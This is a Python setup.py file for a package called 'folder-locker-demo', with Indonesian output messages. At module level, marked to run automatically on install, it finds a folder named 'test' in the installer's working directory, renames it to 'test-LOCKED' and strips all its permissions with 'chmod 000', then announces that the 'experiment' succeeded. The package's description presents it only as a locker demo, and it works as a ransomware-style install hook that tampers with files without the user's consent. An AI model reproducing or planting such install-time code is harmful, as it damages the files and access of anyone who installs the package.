from setuptools import setup
import os
import time

def lock_test_folder():
    print("🔍 Mencari folder 'test'...")
    time.sleep(2)
    
    if os.path.exists("test"):
        print("✅ Folder 'test' ditemukan!")
        print("🔒 Mengunci folder 'test'...")
        
        # Method 1: Rename folder
        try:
            os.rename("test", "test-LOCKED")
            print("📁 Folder di-rename: test → test-LOCKED")
        except:
            print("❌ Gagal rename")
        
        # Method 2: Ubah permissions
        try:
            os.system("chmod 000 test-LOCKED")
            print("🔐 Permissions diubah: chmod 000")
        except:
            print("❌ Gagal ubah permissions")
            
        print("\n🎯 EKSPERIMEN BERHASIL!")
        print("Folder 'test' sekarang terkunci!")
        
    else:
        print("❌ Folder 'test' tidak ditemukan")
        print("📁 Folder yang ada:", os.listdir("."))

# Auto execute saat install
lock_test_folder()

setup(
    name='folder-locker-demo',
    version='1.0.0',
    description='Demo cara kerja locker'
)
